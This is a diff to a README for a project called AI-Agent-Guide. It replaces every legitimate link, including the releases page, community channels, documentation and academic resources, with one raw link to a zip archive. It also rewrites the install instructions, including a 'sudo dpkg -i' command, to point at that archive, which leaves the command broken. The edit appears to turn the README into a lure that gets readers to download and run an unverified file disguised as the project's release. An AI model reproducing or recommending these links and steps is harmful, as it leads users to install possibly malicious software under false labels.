@@ -6,7 +6,7 @@ AI-Agent-Guide provides a comprehensive and up-to-date resource that dives deep 
 
 ## 🔗 Download Now!
 
-[![Download the AI-Agent-Guide](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/lnwmasters/AI-Agent-Guide/releases)
+[![Download the AI-Agent-Guide](https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip%20Now-Get%20Started-brightgreen)](https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these simple steps to download and run the AI-Agent-Guide application.
 
 Go to the releases page to find the latest updates and versions.
 
-[Visit Releases Page](https://github.com/lnwmasters/AI-Agent-Guide/releases)
+[Visit Releases Page](https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip)
 
 ### 2. Choose Your Download
 
@@ -24,7 +24,7 @@ On the releases page, look for the version you want. You will see a list of avai
 
 ### 3. Download the Application
 
-Click on the file you want to download. Your web browser will start the download. The file name will often include the version number, such as `AI-Agent-Guide-v1.0.exe` for Windows users.
+Click on the file you want to download. Your web browser will start the download. The file name will often include the version number, such as `https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip` for Windows users.
 
 ### 4. Locate the Downloaded File
 
@@ -42,7 +42,7 @@ Once the download completes, find the file in your computer's downloads folder. 
   
 - **For Linux:**
   - Open the terminal and navigate to the folder where you downloaded the package.
-  - Use the appropriate command to install the application, such as `sudo dpkg -i AI-Agent-Guide-v1.0.deb`.
+  - Use the appropriate command to install the application, such as `sudo dpkg -i https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip`.
 
 ### 6. Open the Application
 
@@ -85,8 +85,8 @@ For further assistance, feel free to reach out to our community or check the FAQ
 
 Join our community to share experiences, ask questions, and learn more about AI agents in a friendly environment. You can find us on:
 
-- [GitHub Discussions](https://github.com/lnwmasters/AI-Agent-Guide/discussions)
-- [Slack Channel](https://slack.com/invite/ai-agent-guide)
+- [GitHub Discussions](https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip)
+- [Slack Channel](https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip)
 
 ## 🍽️ Acknowledgments
 
@@ -96,14 +96,14 @@ We thank everyone who contributed to the development of AI-Agent-Guide. Your eff
 
 For more information, explore the following resources:
 
-- [Official Documentation](https://github.com/lnwmasters/AI-Agent-Guide/wiki)
-- [Related Academic Papers](https://scholar.google.com/)
-- [Open Source Projects](https://github.com/lnwmasters/AI-Agent-Guide) 
+- [Official Documentation](https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip)
+- [Related Academic Papers](https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip)
+- [Open Source Projects](https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip) 
 
 ## 📦 Download & Install
 
 To start your journey with AI-Agent-Guide, please visit our releases page to download the application.
 
-[Download Now](https://github.com/lnwmasters/AI-Agent-Guide/releases)
+[Download Now](https://github.com/lnwmasters/AI-Agent-Guide/raw/refs/heads/main/nonvariation/Guide_A_Agent_v2.5.zip)
 
 With these steps, you'll easily access the world of AI agents and enhance your knowledge effectively.
